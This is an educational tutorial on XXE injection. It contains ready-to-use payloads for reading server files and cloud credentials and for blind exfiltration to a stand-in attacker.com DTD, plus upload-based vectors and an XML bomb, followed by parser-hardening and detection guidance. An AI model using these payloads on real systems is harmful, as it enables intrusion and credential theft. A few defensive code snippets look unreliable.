# XML External Entity (XXE) Injection

XML External Entity (XXE) injection is a web security vulnerability that exploits weakly configured XML parsers to interfere with an application's processing of XML data. XXE attacks leverage dangerous features in the XML specification—specifically external entities and Document Type Definitions (DTDs)—that allow referencing external resources. Attackers can exploit these features to read arbitrary files from the server filesystem, perform Server-Side Request Forgery (SSRF) attacks against internal systems, execute denial-of-service attacks, and in some cases achieve remote code execution. The vulnerability arises because standard XML parsing libraries enable external entity resolution by default, even when applications don't need this functionality.

The core principle: **XML parsers can load external resources—attackers control what gets loaded**.

## What is XXE? (fundamentals)

### XML basics

**XML structure:**
```xml
<?xml version="1.0" encoding="UTF-8"?>
<stockCheck>
    <productId>123</productId>
    <storeId>5</storeId>
</stockCheck>
```

**Document Type Definition (DTD):**
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE stockCheck [
  <!ELEMENT stockCheck (productId, storeId)>
  <!ELEMENT productId (#PCDATA)>
  <!ELEMENT storeId (#PCDATA)>
]>
<stockCheck>
    <productId>123</productId>
    <storeId>5</storeId>
</stockCheck>
```

**DTD purpose:** Define structure and validation rules for XML documents.

### XML entities

**Internal entity (safe):**
```xml
<!DOCTYPE foo [
  <!ENTITY company "Acme Corporation">
]>
<message>Welcome to &company;</message>
```

**Result:** `Welcome to Acme Corporation`

**External entity (dangerous):**
```xml
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<message>&xxe;</message>
```

**Result:** Contents of /etc/passwd loaded into the document!

### How XXE vulnerabilities arise

**Vulnerable code (PHP):**
```php
<?php
$xml = file_get_contents('php://input');

// Create DOM document
$dom = new DOMDocument();

// Load XML with external entities enabled (default!)
$dom->loadXML($xml, LIBXML_NOENT | LIBXML_DTDLOAD);

// Process data
$productId = $dom->getElementsByTagName('productId')->item(0)->nodeValue;

echo "Product ID: " . $productId;
?>
```

**Vulnerable code (Java):**
```java
DocumentBuilderFactory factory = DocumentBuilderFactory.newInstance();

// External entities enabled by default!
DocumentBuilder builder = factory.newDocumentBuilder();

// Parse user-supplied XML
Document doc = builder.parse(new InputSource(new StringReader(xmlInput)));

// Process document
String productId = doc.getElementsByTagName("productId").item(0).getTextContent();
```

**Vulnerable code (Python):**
```python
from xml.etree import ElementTree as ET

# Parse XML (vulnerable to XXE in older Python versions)
tree = ET.fromstring(xml_input)

productId = tree.find('productId').text
print(f"Product ID: {productId}")
```

**The problem:** Default XML parsers resolve external entities automatically.

## Types of XXE attacks

### Type 1: Classic XXE - File retrieval

**Goal:** Read arbitrary files from server filesystem.

#### Basic file retrieval

**Normal request:**
```http
POST /product/stock HTTP/1.1
Host: vulnerable-website.com
Content-Type: application/xml
Content-Length: 118

<?xml version="1.0" encoding="UTF-8"?>
<stockCheck>
    <productId>381</productId>
    <storeId>1</storeId>
</stockCheck>
```

**Malicious XXE payload:**
```http
POST /product/stock HTTP/1.1
Host: vulnerable-website.com
Content-Type: application/xml
Content-Length: 200

<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
<stockCheck>
    <productId>&xxe;</productId>
    <storeId>1</storeId>
</stockCheck>
```

**Response:**
```
Invalid product ID: root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
```

**Success:** /etc/passwd file contents returned!

#### Lab walkthrough: Exploiting XXE to retrieve files

**Scenario:** Stock checker application accepts XML input.

**Step 1: Identify XML input**
```http
POST /product/stock HTTP/1.1

<?xml version="1.0" encoding="UTF-8"?>
<stockCheck><productId>1</productId></stockCheck>
```

**Step 2: Test for XXE**
```http
POST /product/stock HTTP/1.1

<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE test [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
<stockCheck><productId>&xxe;</productId></stockCheck>
```

**Step 3: Analyze response**
```
Invalid product ID: root:x:0:0:root:/root:/bin/bash
[... /etc/passwd contents ...]
```

**Step 4: Read other sensitive files**
```xml
<!-- Windows -->
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///c:/windows/win.ini"> ]>

<!-- Linux config files -->
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/hostname"> ]>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/hosts"> ]>

<!-- Application files -->
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///var/www/html/config.php"> ]>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///home/user/.ssh/id_rsa"> ]>
```

#### Common target files

**Linux systems:**
```
/etc/passwd - User accounts
/etc/shadow - Password hashes (if readable)
/etc/hostname - System hostname
/etc/hosts - DNS mappings
/proc/self/environ - Environment variables
/proc/self/cmdline - Process command line
/var/log/apache2/access.log - Web server logs
/var/www/html/config.php - Application config
/home/user/.bash_history - Command history
/home/user/.ssh/id_rsa - SSH private keys
```

**Windows systems:**
```
C:\Windows\win.ini - Windows config
C:\Windows\System32\drivers\etc\hosts - DNS mappings
C:\inetpub\wwwroot\web.config - IIS configuration
C:\Users\Administrator\Desktop\password.txt - User files
```

**Application-specific:**
```
/var/www/html/wp-config.php - WordPress database credentials
/var/www/html/.env - Laravel/Node.js environment variables
/opt/tomcat/conf/tomcat-users.xml - Tomcat credentials
config/database.yml - Rails database config
```

### Type 2: XXE for SSRF attacks

**Goal:** Make server perform HTTP requests to internal systems.

#### Basic SSRF via XXE

**Payload:**
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://192.168.0.1/admin"> ]>
<stockCheck>
    <productId>&xxe;</productId>
</stockCheck>
```

**Server behavior:**
```
1. Parser encounters &xxe; entity
2. Resolves external entity: http://192.168.0.1/admin
3. Makes HTTP request to internal admin panel
4. Returns response in productId field
```

**Response:**
```
Invalid product ID: <html>
<h1>Admin Panel</h1>
<a href="/delete-user?username=carlos">Delete user</a>
</html>
```

#### Lab: Exploiting XXE to perform SSRF

**Scenario:** Access internal metadata service at http://169.254.169.254/

**Payload:**
```http
POST /product/stock HTTP/1.1

<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/iam/security-credentials/admin"> ]>
<stockCheck><productId>&xxe;</productId></stockCheck>
```

**Response:**
```json
Invalid product ID: {
  "AccessKeyId": "ASIA...",
  "SecretAccessKey": "...",
  "Token": "..."
}
```

**AWS credentials stolen via XXE!**

#### SSRF targets via XXE

**Internal services:**
```xml
<!-- Internal admin panels -->
<!ENTITY xxe SYSTEM "http://localhost/admin">
<!ENTITY xxe SYSTEM "http://192.168.1.1/manager">

<!-- Internal APIs -->
<!ENTITY xxe SYSTEM "http://internal-api.local/users">
<!ENTITY xxe SYSTEM "http://10.0.0.5:8080/api/sensitive-data">

<!-- Databases (may return errors with info) -->
<!ENTITY xxe SYSTEM "http://192.168.1.100:3306">
<!ENTITY xxe SYSTEM "http://192.168.1.100:5432">
```

**Cloud metadata services:**
```xml
<!-- AWS -->
<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">
<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/iam/security-credentials/">

<!-- Google Cloud -->
<!ENTITY xxe SYSTEM "http://metadata.google.internal/computeMetadata/v1/">
<!ENTITY xxe SYSTEM "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token">

<!-- Azure -->
<!ENTITY xxe SYSTEM "http://169.254.169.254/metadata/instance?api-version=2021-02-01">
```

**Port scanning:**
```xml
<!-- Scan for open ports -->
<!ENTITY xxe SYSTEM "http://192.168.1.1:22">   <!-- SSH -->
<!ENTITY xxe SYSTEM "http://192.168.1.1:3306"> <!-- MySQL -->
<!ENTITY xxe SYSTEM "http://192.168.1.1:6379"> <!-- Redis -->
```

**Timing distinguishes open vs. closed:**
```
Open port: Fast response or connection accepted
Closed port: Timeout after several seconds
```

### Type 3: Blind XXE vulnerabilities

**Characteristic:** Application processes external entities but doesn't return the content in responses.

**Vulnerable code:**
```python
def process_xml(xml_input):
    tree = ET.fromstring(xml_input)
    
    # External entity processed but not returned
    productId = tree.find('productId').text
    
    # Process data internally
    check_stock(productId)
    
    # Generic response (no entity content shown)
    return "Stock check complete"
```

#### Detection: Out-of-band (OOB) technique

**Step 1: Use Burp Collaborator or similar**
```
Burp Collaborator domain: unique-id.burpcollaborator.net
```

**Step 2: Inject OOB payload**
```http
POST /product/stock HTTP/1.1

<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://unique-id.burpcollaborator.net"> ]>
<stockCheck><productId>&xxe;</productId></stockCheck>
```

**Step 3: Check Collaborator**
```
[+] DNS lookup from 203.0.113.50
[+] HTTP request from 203.0.113.50
    GET / HTTP/1.1
    Host: unique-id.burpcollaborator.net
```

**Blind XXE confirmed!**

#### Exploitation: Out-of-band data exfiltration

**Goal:** Exfiltrate file contents via DNS or HTTP to attacker's server.

**Technique: Parameter entities**

**Attacker hosts malicious DTD (evil.dtd) on their server:**
```xml
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; exfiltrate SYSTEM 'http://attacker.com/?data=%file;'>">
%eval;
%exfiltrate;
```

**XXE payload referencing external DTD:**
```http
POST /product/stock HTTP/1.1

<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
<!ENTITY % xxe SYSTEM "http://attacker.com/evil.dtd">
%xxe;
]>
<stockCheck><productId>1</productId></stockCheck>
```

**Execution flow:**
```
1. Parser fetches http://attacker.com/evil.dtd
2. evil.dtd defines %file entity (reads /etc/passwd)
3. evil.dtd defines %eval entity (creates %exfiltrate)
4. %exfiltrate makes HTTP request with /etc/passwd contents
5. Attacker receives: GET /?data=root:x:0:0:...
```

**Attacker's server logs:**
```
GET /?data=root:x:0:0:root:/root:/bin/bash%0Adaemon:x:1:1:daemon:... HTTP/1.1
```

**File contents exfiltrated!**

#### Error-based blind XXE

**Goal:** Trigger XML parsing errors that leak file contents.

**Payload:**
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; error SYSTEM 'file:///nonexistent/%file;'>">
%eval;
%error;
]>
<stockCheck><productId>1</productId></stockCheck>
```

**Expected error message:**
```
XML parsing error: Failed to load external entity 'file:///nonexistent/root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
...'
```

**Error contains /etc/passwd!**

**Alternative error-based technique:**
```xml
<!DOCTYPE foo [
<!ENTITY % file SYSTEM "file:///etc/hostname">
<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://nonexistent-host/%file;'>">
%eval;
%exfil;
]>
```

**Error:**
```
Cannot resolve hostname: [hostname-from-file].nonexistent-host
```

### Type 4: XInclude attacks

**Scenario:** You control only a data value, not the entire XML document.

**Application code:**
```python
# Application constructs XML server-side
product_id = request.form['productId']  # User input

# Application builds XML
xml = f"""
<?xml version="1.0" encoding="UTF-8"?>
<stockCheck>
    <productId>{product_id}</productId>
    <storeId>1</storeId>
</stockCheck>
"""

# Parse XML
process_xml(xml)
```

**Problem:** Can't inject DOCTYPE because you don't control the XML structure.

**Solution: XInclude**

**XInclude namespace:** Allows including external XML documents at specific points.

**Payload:**
```http
POST /product/stock HTTP/1.1
Content-Type: application/x-www-form-urlencoded

productId=<foo xmlns:xi="http://www.w3.org/2001/XInclude"><xi:include parse="text" href="file:///etc/passwd"/></foo>
```

**Resulting XML:**
```xml
<?xml version="1.0" encoding="UTF-8"?>
<stockCheck>
    <productId><foo xmlns:xi="http://www.w3.org/2001/XInclude">
        <xi:include parse="text" href="file:///etc/passwd"/>
    </foo></productId>
    <storeId>1</storeId>
</stockCheck>
```

**Result:** /etc/passwd contents included in productId element!

#### Lab: Exploiting XInclude to retrieve files

**Scenario:** Application embeds user input into server-side XML.

**Normal request:**
```http
POST /product/stock HTTP/1.1

productId=123&storeId=1
```

**XInclude payload:**
```http
POST /product/stock HTTP/1.1

productId=<foo xmlns:xi="http://www.w3.org/2001/XInclude"><xi:include parse="text" href="file:///etc/passwd"/></foo>&storeId=1
```

**Response:**
```
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
```

**Success!**

### Type 5: XXE via file upload

**Scenario:** Application accepts file uploads (images, documents).

#### XXE via SVG upload

**SVG files are XML-based!**

**Malicious SVG:**
```xml
<?xml version="1.0" standalone="yes"?>
<!DOCTYPE test [ <!ENTITY xxe SYSTEM "file:///etc/hostname"> ]>
<svg width="128px" height="128px" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" version="1.1">
    <text font-size="16" x="0" y="16">&xxe;</text>
</svg>
```

**Upload flow:**
```
1. User uploads malicious.svg
2. Server parses SVG (XML parser)
3. External entity resolved (reads /etc/hostname)
4. If server generates thumbnail/preview, hostname appears in image
5. Or if server validates SVG structure, entity expanded in error messages
```

#### Lab: Exploiting XXE via image file upload

**Scenario:** Avatar upload feature that processes SVG images.

**Step 1: Create malicious SVG**
```xml
<?xml version="1.0" standalone="yes"?>
<!DOCTYPE test [ <!ENTITY xxe SYSTEM "file:///etc/hostname"> ]>
<svg width="200px" height="200px" xmlns="http://www.w3.org/2000/svg">
    <text font-size="16" x="0" y="16">&xxe;</text>
</svg>
```

**Save as:** avatar.svg

**Step 2: Upload via avatar form**
```http
POST /my-account/avatar HTTP/1.1
Content-Type: multipart/form-data; boundary=----WebKitFormBoundary

------WebKitFormBoundary
Content-Disposition: form-data; name="avatar"; filename="avatar.svg"
Content-Type: image/svg+xml

<?xml version="1.0" standalone="yes"?>
<!DOCTYPE test [ <!ENTITY xxe SYSTEM "file:///etc/hostname"> ]>
<svg width="200px" height="200px" xmlns="http://www.w3.org/2000/svg">
    <text font-size="16" x="0" y="16">&xxe;</text>
</svg>
------WebKitFormBoundary--
```

**Step 3: View rendered avatar**
```
Avatar displays text: web-server-01
```

**Hostname leaked!**

**Step 4: Escalate to read sensitive files**
```xml
<!DOCTYPE test [ <!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd"> ]>
```

**Response:** Base64-encoded /etc/passwd

#### XXE via Office documents (DOCX, XLSX)

**Office Open XML formats are ZIP archives containing XML files!**

**DOCX structure:**
```
document.docx
├── [Content_Types].xml
├── _rels/
├── word/
│   ├── document.xml       ← Main content
│   ├── _rels/
│   │   └── document.xml.rels
│   └── ...
```

**Exploitation:**

**Step 1: Create normal DOCX document**

**Step 2: Extract (unzip) DOCX**
```bash
unzip document.docx -d document_files/
```

**Step 3: Modify word/document.xml**
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE root [
<!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<w:document xmlns:w="http://schemas.openxmlformats.org/wordprocessingml/2006/main">
    <w:body>
        <w:p>
            <w:r>
                <w:t>&xxe;</w:t>
            </w:r>
        </w:p>
    </w:body>
</w:document>
```

**Step 4: Rezip**
```bash
cd document_files/
zip -r ../malicious.docx *
```

**Step 5: Upload malicious.docx**

**If server processes/renders document:**
```
Document contains /etc/passwd contents!
```

### Type 6: XXE via content-type modification

**Scenario:** Application expects form data but accepts XML if Content-Type changed.

**Normal request:**
```http
POST /action HTTP/1.1
Host: vulnerable-website.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 7

foo=bar
```

**Modified to XML:**
```http
POST /action HTTP/1.1
Host: vulnerable-website.com
Content-Type: text/xml
Content-Length: 52

<?xml version="1.0" encoding="UTF-8"?>
<foo>bar</foo>
```

**If application tolerates XML and parses it:**
```http
POST /action HTTP/1.1
Host: vulnerable-website.com
Content-Type: text/xml

<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
<foo>&xxe;</foo>
```

**Result:** XXE vulnerability exposed!

**Testing methodology:**
```
1. Identify POST endpoints accepting form data
2. Change Content-Type to: text/xml, application/xml
3. Convert form parameters to XML structure:
   name=John&age=30
   
   Becomes:
   <data>
     <name>John</name>
     <age>30</age>
   </data>

4. Test for XXE by injecting external entities
```

## Advanced XXE exploitation

### Technique 1: PHP wrappers for filter bypass

**Base64 encoding for binary/problematic files:**
```xml
<!DOCTYPE foo [
<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">
]>
<foo>&xxe;</foo>
```

**Response:**
```
cm9vdDp4OjA6MDpyb290Oi9yb290Oi9iaW4vYmFzaAo...
```

**Decode:**
```bash
echo "cm9vdDp4OjA6MDpyb290Oi9yb290Oi9iaW4vYmFzaAo..." | base64 -d
root:x:0:0:root:/root:/bin/bash
```

**Why useful:** Avoids XML parsing errors from special characters.

**Read PHP source code:**
```xml
<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=index.php">
```

**Result:** Base64-encoded source code (bypasses PHP execution).

### Technique 2: XXE with parameter entities

**Parameter entities (%) work differently than general entities (&).**

**General entity:**
```xml
<!ENTITY xxe "value">
Use: &xxe;
```

**Parameter entity:**
```xml
<!ENTITY % xxe "value">
Use: %xxe;
```

**Parameter entities allowed only in DTD context.**

**Advanced exfiltration with parameter entities:**

**External DTD (hosted on attacker.com/evil.dtd):**
```xml
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://attacker.com/?x=%file;'>">
%eval;
%exfil;
```

**Main payload:**
```xml
<?xml version="1.0"?>
<!DOCTYPE foo [
<!ENTITY % xxe SYSTEM "http://attacker.com/evil.dtd">
%xxe;
]>
<foo>test</foo>
```

**Execution:**
```
1. %xxe; loads external DTD
2. %file; reads /etc/passwd
3. %eval; creates %exfil; entity with file contents
4. %exfil; makes HTTP request to attacker.com with data
```

### Technique 3: XXE with UTF-7 encoding

**Bypass filters checking for "ENTITY" keyword:**

**UTF-7 encoded payload:**
```xml
<?xml version="1.0" encoding="UTF-7"?>
+ADw-+ACE-DOCTYPE foo+AFs-+ADw-+ACE-ENTITY xxe SYSTEM +ACI-file:///etc/passwd+ACI-+AD4-+AF0-+AD4-
<foo>&xxe;</foo>
```

**After UTF-7 decoding becomes:**
```xml
<!DOCTYPE foo[<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
```

### Technique 4: Billion Laughs Attack (XML bomb / DoS)

**Goal:** Cause denial of service via entity expansion.

**Payload:**
```xml
<?xml version="1.0"?>
<!DOCTYPE lolz [
  <!ENTITY lol "lol">
  <!ENTITY lol1 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">
  <!ENTITY lol2 "&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;">
  <!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;">
  <!ENTITY lol4 "&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;">
  <!ENTITY lol5 "&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;">
  <!ENTITY lol6 "&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;">
  <!ENTITY lol7 "&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;">
  <!ENTITY lol8 "&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;">
  <!ENTITY lol9 "&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;">
]>
<lolz>&lol9;</lolz>
```

**Expansion:**
```
lol9 expands to 10 × lol8
lol8 expands to 10 × lol7
...
Final expansion: 10^9 = 1 billion "lol" strings
Memory consumption: Several GB
```

**Result:** Server runs out of memory, crashes (DoS).

### Technique 5: XXE in SOAP requests

**SOAP uses XML for message structure.**

**Normal SOAP request:**
```xml
POST /soap-endpoint HTTP/1.1
Content-Type: text/xml

<?xml version="1.0"?>
<soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
  <soap:Body>
    <GetUserInfo>
      <userId>123</userId>
    </GetUserInfo>
  </soap:Body>
</soap:Envelope>
```

**XXE injection:**
```xml
POST /soap-endpoint HTTP/1.1
Content-Type: text/xml

<?xml version="1.0"?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
<soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
  <soap:Body>
    <GetUserInfo>
      <userId>&xxe;</userId>
    </GetUserInfo>
  </soap:Body>
</soap:Envelope>
```

## Prevention strategies

### Defense Layer 1: Disable external entities (primary defense)

**PHP (libxml):**
```php
<?php
// Disable external entities
libxml_disable_entity_loader(true);

// Create DOM document
$dom = new DOMDocument();
$dom->loadXML($xml_input, LIBXML_NOENT | LIBXML_DTDLOAD);
```

**Better PHP approach (modern):**
```php
<?php
$dom = new DOMDocument();

// Disable external entities via libxml options
libxml_set_external_entity_loader(function() {
    return null;
});

$dom->loadXML($xml_input);
```

**Java (DocumentBuilderFactory):**
```java
DocumentBuilderFactory factory = DocumentBuilderFactory.newInstance();

// Disable external entities
factory.setFeature("http://xml.org/sax/features/external-general-entities", false);
factory.setFeature("http://xml.org/sax/features/external-parameter-entities", false);

// Disable external DTDs
factory.setFeature("http://apache.org/xml/features/disallow-doctype-decl", true);

// Disable XInclude
factory.setXIncludeAware(false);
factory.setExpandEntityReferences(false);

DocumentBuilder builder = factory.newDocumentBuilder();
Document doc = builder.parse(new InputSource(new StringReader(xmlInput)));
```

**Java (SAXParserFactory):**
```java
SAXParserFactory factory = SAXParserFactory.newInstance();

// Disable external entities
factory.setFeature("http://xml.org/sax/features/external-general-entities", false);
factory.setFeature("http://xml.org/sax/features/external-parameter-entities", false);

// Disable DTDs entirely
factory.setFeature("http://apache.org/xml/features/disallow-doctype-decl", true);

SAXParser parser = factory.newSAXParser();
```

**Python (defusedxml - recommended):**
```python
# Don't use standard library xml modules
# from xml.etree import ElementTree  # VULNERABLE

# Use defusedxml instead
from defusedxml.ElementTree import fromstring

# Safe parsing
tree = fromstring(xml_input)
```

**Python (manual configuration):**
```python
from xml.etree.ElementTree import XMLParser

# Create parser with entity resolution disabled
parser = XMLParser()
parser.entity = {}  # Disable entities
parser.parser.SetParamEntityParsing(0)  # Disable parameter entities

tree = ET.fromstring(xml_input, parser=parser)
```

**Node.js (libxmljs):**
```javascript
const libxmljs = require('libxmljs');

// Parse with noent and nonet options disabled
const doc = libxmljs.parseXml(xmlInput, {
    noent: false,   // Don't substitute entities
    nonet: true,    // Forbid network access
    dtdload: false, // Don't load external DTDs
    dtdvalid: false // Don't validate against DTD
});
```

**.NET (C#):**
```csharp
XmlReaderSettings settings = new XmlReaderSettings();

// Disable external entities
settings.DtdProcessing = DtdProcessing.Prohibit;
settings.XmlResolver = null;

XmlReader reader = XmlReader.Create(stream, settings);
```

### Defense Layer 2: Input validation

**Validate XML structure before parsing:**
```python
def is_safe_xml(xml_string):
    # Check for suspicious keywords
    dangerous_keywords = [
        '<!DOCTYPE',
        '<!ENTITY',
        'SYSTEM',
        'PUBLIC',
        'file://',
        'http://',
        'ftp://',
        'php://',
        'data://'
    ]
    
    xml_upper = xml_string.upper()
    
    for keyword in dangerous_keywords:
        if keyword.upper() in xml_upper:
            return False
    
    return True

# Usage
if not is_safe_xml(user_xml):
    raise ValueError("Potentially malicious XML detected")
```

**Note:** This is defense-in-depth, not primary defense. Attackers can bypass keyword filters.

### Defense Layer 3: Use less complex data formats

**Prefer JSON over XML when possible:**

**XML (complex, has XXE risk):**
```xml
<?xml version="1.0"?>
<user>
    <name>John</name>
    <age>30</age>
</user>
```

**JSON (simple, no XXE risk):**
```json
{
    "name": "John",
    "age": 30
}
```

**Migrate APIs from XML to JSON where feasible.**

### Defense Layer 4: Web Application Firewall (WAF)

**Configure WAF rules to block XXE patterns:**
```
Block requests containing:
- <!DOCTYPE
- <!ENTITY
- SYSTEM "file://
- SYSTEM "http://169.254.169.254
```

**Limitations:** Can be bypassed with encoding, but adds defense layer.

### Defense Layer 5: Principle of least privilege

**File system permissions:**
```bash
# Application should not have read access to sensitive files
chmod 600 /etc/shadow
chmod 600 /root/.ssh/id_rsa
chmod 600 /var/www/html/.env

# Run application as unprivileged user
useradd -r -s /bin/false webapp
su webapp -c 'python app.py'
```

**Network restrictions:**
```
Firewall rules for application server:
- Block outbound to 169.254.169.254 (cloud metadata)
- Block outbound to internal networks
- Allow only necessary external connections
```

### Defense Layer 6: Monitoring and detection

**Log XML parsing activities:**
```python
import logging

def parse_xml_safe(xml_input):
    logger.info(f"Parsing XML from user {current_user}")
    logger.info(f"XML length: {len(xml_input)}")
    
    # Check for suspicious patterns
    if '<!ENTITY' in xml_input or '<!DOCTYPE' in xml_input:
        logger.warning(f"Suspicious XML from {current_user}: {xml_input[:100]}")
    
    # Parse safely
    try:
        tree = defusedxml.fromstring(xml_input)
    except Exception as e:
        logger.error(f"XML parsing error: {e}")
        raise
```

**Alert on:**
- XML with DOCTYPE declarations
- XML with ENTITY definitions
- File access attempts
- Outbound HTTP requests during XML parsing
- Excessive memory consumption (Billion Laughs)

### Complete secure implementation

**Python with defusedxml:**
```python
from defusedxml import ElementTree as ET
from flask import Flask, request, abort
import logging

app = Flask(__name__)
logger = logging.getLogger(__name__)

ALLOWED_XML_SIZE = 1024 * 100  # 100KB max

@app.route('/process-xml', methods=['POST'])
def process_xml():
    xml_input = request.data.decode('utf-8')
    
    # Size check
    if len(xml_input) > ALLOWED_XML_SIZE:
        logger.warning(f"Oversized XML rejected: {len(xml_input)} bytes")
        abort(400, "XML too large")
    
    # Suspicious pattern check
    if '<!ENTITY' in xml_input.upper() or '<!DOCTYPE' in xml_input.upper():
        logger.warning(f"Suspicious XML rejected from {request.remote_addr}")
        abort(400, "Invalid XML structure")
    
    # Safe parsing with defusedxml
    try:
        tree = ET.fromstring(xml_input)
    except ET.ParseError as e:
        logger.error(f"XML parsing error: {e}")
        abort(400, "Invalid XML")
    
    # Process data
    product_id = tree.find('productId')
    
    if product_id is None:
        abort(400, "Missing productId")
    
    # Business logic
    result = check_stock(product_id.text)
    
    return {"stock": result}
```

**Java with secure configuration:**
```java
import javax.xml.parsers.DocumentBuilderFactory;
import javax.xml.parsers.ParserConfigurationException;
import org.xml.sax.SAXException;
import java.io.IOException;

public class SecureXMLParser {
    
    public static Document parseXMLSecurely(String xmlInput) 
        throws ParserConfigurationException, SAXException, IOException {
        
        DocumentBuilderFactory factory = DocumentBuilderFactory.newInstance();
        
        // Disable all dangerous features
        factory.setFeature("http://apache.org/xml/features/disallow-doctype-decl", true);
        factory.setFeature("http://xml.org/sax/features/external-general-entities", false);
        factory.setFeature("http://xml.org/sax/features/external-parameter-entities", false);
        factory.setFeature("http://apache.org/xml/features/nonvalidating/load-external-dtd", false);
        factory.setXIncludeAware(false);
        factory.setExpandEntityReferences(false);
        
        DocumentBuilder builder = factory.newDocumentBuilder();
        
        return builder.parse(new InputSource(new StringReader(xmlInput)));
    }
}
```
